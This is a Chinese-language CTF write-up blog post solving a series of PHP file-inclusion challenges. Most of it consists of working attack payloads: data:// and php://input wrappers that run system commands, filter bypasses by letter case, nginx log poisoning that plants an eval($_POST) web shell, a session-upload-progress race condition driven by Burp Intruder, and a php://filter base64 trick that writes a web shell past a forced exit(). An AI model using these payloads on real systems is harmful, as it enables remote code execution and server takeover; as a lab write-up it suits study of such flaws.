---
title: 文件包含
date: 2026-05-27 20:47:48
categories:
  - CTF
tags:
  - FL
description: 学习文件包含ing~
cover: /img/cover-tech.svg
comments: true
---

文件包含进去后随便点个左边的列表，发现 URL 中多了个 `?file=pages/faq.php` ，结合该题是文件包含，先试试 data 伪协议：

http

自动换行复制

```http
?file=data:,<?php system('ls /')?>
```

找到 flag.txt ，再传入：

http

自动换行复制

```http
?file=data:,<?php system('cat /flag.txt')?>
```

## [EZFL_1](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_1)

传入：

http

自动换行复制

```http
?file=data:,<?php system('ls')?>
?file=data:,<?php system('tac flag.php')?>
```

## [EZFL_2](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_2)

还是传入：

http

自动换行复制

```http
?file=data:,<?php system('tac flag.php')?>
```

## [EZFL_3](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_3)

传入：

http

自动换行复制

```http
?file=data:,<?php system('ls /')?>
?file=data:,<?php system('nl /flag-r66A6J0enB7hTvWMbDHisiOZGtpmne.txt')?>
```

## [EZFL_4](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_4)

传入：

http

自动换行复制

```http
?file=data:,<?php system('ls')?>
```

返回 `php not allowed` ，说明过滤了 php，可以用大小写绕过：

http

自动换行复制

```http
?file=data:,<?pHp system('ls')?>
?file=data:,<?pHp system('tac f*')?>
```

## [EZFL_5](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_5)

传入：

http

自动换行复制

```http
?file=data:,<?pHp system('ls')?>
```

返回 `data not allowed` ，说明过滤了 data ，

换一个伪协议做：

http

自动换行复制

```http
?file=PHP://input
POST: <?php system("tac flag.php");?>
```

要用 bp 传，网上说是 hackbar 的问题。

## [EZFL_6](https://blog.yanxisishi.top/2026/qingcen_web_03#ezfl_6)

这次大小写也绕不过 PHP 了，可以用日志注入：

http

自动换行复制

```http
?file=/var/log/nginx/access.log
User-Agent: <?php eval($_POST[1]);?>
```

然后用蚁剑连接或者用 $_POST1 进行 RCE 什么的都可以。

但是这么简单结束文件包含也不合适，这里介绍另一种方法 —— **利用 `PHP_SESSION_UPLOAD_PROGRESS` 配合并发请求进行条件竞争** ：

1. 准备上传表单：

   创建

    

   ```
   exp.html
   ```

    

   ：

   html

   自动换行复制

   ```html
   <!DOCTYPE html>
   <html>
   <body>
       <form action="http://docker.qingcen.net:44232/" method="POST" enctype="multipart/form-data">
           
           <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('cat /flag.txt'); ?>" />
           
           <input type="file" name="file" />
           
           <input type="submit" value="开始上传" />
       </form>
   </body>
   </html>
   ```

2. 发起“写”请求竞争：

   这个步骤的目的是让服务器不断生成包含恶意代码的临时 Session 文件。

   1. 在浏览器中打开刚才写好的 `exp.html`，随意上传一个文件并用 bp 抓包。

   2. 在请求头中添加或修改 Cookie 字段，指定一个固定的 Session ID（例如

       

      ```
      abc
      ```

      ）：

      text

      自动换行复制

      ```text
      Cookie: PHPSESSID=abc
      ```

      然后将这个修改后的数据包发送到 Intruder 。

   3. Intruder 配置：
      选择 Null payloads 、无限重复、最大并发请求数设置为 30 左右。

3. 发起“读”请求竞争：

   这个步骤的目的是利用目标网站的 LFI 漏洞（即

    

   ```
   ?file=
   ```

    

   参数），在临时文件被服务器删除前，抢先包含并执行它。

   1. 抓包原网页，将请求路径修改为包含临时文件的路径（Linux 下默认路径为

       

      ```
      /tmp/sess_
      ```

       

      加上刚才指定的 PHPSESSID）。

      http

      自动换行复制

      ```http
      GET /?file=/tmp/sess_abc HTTP/1.1
      Host: docker.qingcen.net:44232
      ```

      然后将这个 GET 请求同样发送到 Intruder 。

   2. Intruder 配置：
      选择 Null payloads 、无限重复、最大并发请求数设置为 80 左右。

4. 并发执行与获取结果：
   30 个线程在不断往 `/tmp/sess_abc` 写恶意代码，80 个线程在不断尝试读取 `/tmp/sess_abc`。
   主要去看**发起“读”请求竞争**的攻击面板，筛选长度找到 flag 。
   ![image-20260424211640505](https://img.yanxisishi.top/images/2026/04/image-20260424211640505.png)

ezfl7

**源码分析：**



```php
file_put_contents($filename, "<?php exit();?>" . $content);
```

可以在任意文件写入内容，但开头被强制拼接了 `<?php exit();?>` 阻止直接执行。

**绕过原理：**

利用 `php://filter` 的 `convert.base64-decode` 链：

1. `<?php exit();?>` 中的 `<`, `?`, `>`, `(`, `)`, `;`, ``7 个字符不属于 base64 字符集，解码时被自动丢弃
2. 只剩 `phpexit` 这 7 个有效 base64 字符
3. 在 content 前补 1 个字母 `a`，凑成 `phpexita` = 8 字符（4 的倍数）
4. 后续接 `<?php @eval($_POST['cmd']);?>` 的 base64 编码
5. 解码后只产生 6 字节乱码（无害输出），后面的 PHP shell 正常执行

**攻击 payload：**

```
POST 
filename = php://filter/write=convert.base64-decode/resource=shell.php
content  = aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
```

发现界面回显的write ok"修改攻击器里面的内容

```
POST /s.php HTTP/1.1
Host: docker.qingcen.net:44714
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

cmd=ls -la
```

发送请求后发现一堆文件，发现一个可疑的康可文件，直接查看文件即可找到flag

```
total 32
-rwxr-xr-x  www-data  c0nq4er1ng.php
-rw-r--r--  www-data  conquer.php       ← 可疑
-rwxr-xr-x  www-data  index.php
drwxr-xr-x  www-data  pages
-rw-r--r--  www-data  s.php
```
所有题目均由青岑提供，若有侵权，请及时联系作者
